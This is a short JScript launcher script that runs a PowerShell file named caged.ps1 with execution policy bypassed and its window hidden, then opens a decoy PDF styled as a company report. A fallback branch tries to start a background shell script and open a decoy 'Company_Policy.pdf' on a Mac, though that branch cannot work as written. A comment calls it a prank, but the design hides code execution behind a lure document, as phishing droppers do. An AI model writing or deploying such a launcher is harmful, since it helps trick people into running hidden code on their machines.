var shell = new ActiveXObject("WScript.Shell");

try {
    // Try running the Windows prank
    shell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File caged.ps1", 0, false);
    shell.Run("GM-VisionFrame 25Q2.pdf", 1, false);
} catch (e) {
    // If Windows fails, assume Mac
    var macScript = "osascript -e 'do shell script \"nohup ~/Desktop/caged.sh &>/dev/null & open ~/Desktop/Company_Policy.pdf\"'";
    shell.Run("cmd.exe /c " + macScript, 0, false);
}